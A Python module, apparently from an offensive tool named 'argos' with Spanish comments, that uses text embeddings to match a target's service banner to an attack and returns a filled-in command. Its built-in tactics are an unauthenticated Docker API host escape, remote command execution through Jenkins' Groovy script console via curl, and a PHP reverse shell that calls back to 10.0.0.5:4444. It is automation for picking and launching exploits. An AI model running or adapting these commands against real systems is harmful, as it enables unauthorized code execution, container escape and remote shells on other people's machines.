"""
core/semantic_advisor.py
────────────────────────
Motor de Inferencia Semántica (Remplazo de LLM, 100% Offline).
Utiliza embeddings vectoriales ligeros para encontrar tácticas relevantes
ante servicios desconocidos sin consumir memoria excesiva ni APIs.
"""

import logging
from typing import Dict, Optional

try:
    from sentence_transformers import SentenceTransformer, util
except ImportError:
    SentenceTransformer = None

log = logging.getLogger("argos.semantic_advisor")

class SemanticAdvisor:
    def __init__(self, model_name: str = "all-MiniLM-L6-v2", lhost: str = "10.0.0.5", lport: str = "4444"):
        self.enabled = SentenceTransformer is not None
        self.model = None
        self.tactics_db = []
        self.tactics_embeddings = None
        self.lhost = lhost
        self.lport = lport

        if not self.enabled:
            log.warning("SentenceTransformers no instalado. SemanticAdvisor deshabilitado.")
            return

        log.info(f"[SemanticAdvisor] Cargando modelo ligero: {model_name}")
        self.model = SentenceTransformer(model_name)
        self._load_knowledge_base()

    def _load_knowledge_base(self):
        """Carga la base de datos de GTFOBins / Exploits."""
        # En un entorno real, esto leería de un archivo JSON masivo.
        # Aquí simulamos un subconjunto precargado:
        self.tactics_db = [
            {
                "id": "T1609_docker",
                "desc": "docker container exec unauthenticated escape mount",
                "cmd_template": "docker -H tcp://{TARGET_IP}:{PORT} run -it -v /:/host/ alpine chroot /host/ sh"
            },
            {
                "id": "T1190_jenkins",
                "desc": "jenkins unauthenticated groovy script console execution",
                "cmd_template": "curl -X POST http://{TARGET_IP}:{PORT}/script -d 'script=def process=\"id\".execute();println process.text'"
            },
            {
                "id": "T1059_php",
                "desc": "php reverse shell simple upload execution",
                "cmd_template": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            }
        ]

        # Pre-calcular embeddings de las descripciones
        sentences = [t["desc"] for t in self.tactics_db]
        if sentences:
            self.tactics_embeddings = self.model.encode(sentences, convert_to_tensor=True)
            log.info(f"[SemanticAdvisor] {len(sentences)} tácticas vectorizadas.")

    def suggest_tactic(self, service_banner: str, port: int, target_ip: str) -> Optional[Dict[str, str]]:
        """Busca el comando más apropiado basado en el banner del servicio."""
        if not self.enabled or self.tactics_embeddings is None:
            return None

        # Codificar la query (el banner del servicio)
        query_embedding = self.model.encode(service_banner.lower(), convert_to_tensor=True)

        # Buscar similitud del coseno
        hits = util.semantic_search(query_embedding, self.tactics_embeddings, top_k=1)

        if not hits or not hits[0]:
            return None

        best_hit = hits[0][0]
        score = best_hit['score']

        # Si no hay confianza suficiente, no sugerir nada
        if score < 0.4:
            return None

        tactic = self.tactics_db[best_hit['corpus_id']]

        # Inyectar placeholders dinámicamente
        cmd = tactic["cmd_template"].format(
            TARGET_IP=target_ip,
            PORT=port,
            LHOST=self.lhost,
            LPORT=self.lport,
        )

        log.info(f"[SemanticAdvisor] Match encontrado: {tactic['id']} (Similitud: {score:.2f})")
        return {
            "action": "semantic_inferred_exploit",
            "mitre_id": tactic["id"].split("_")[0],
            "command": cmd,
            "confidence": score
        }
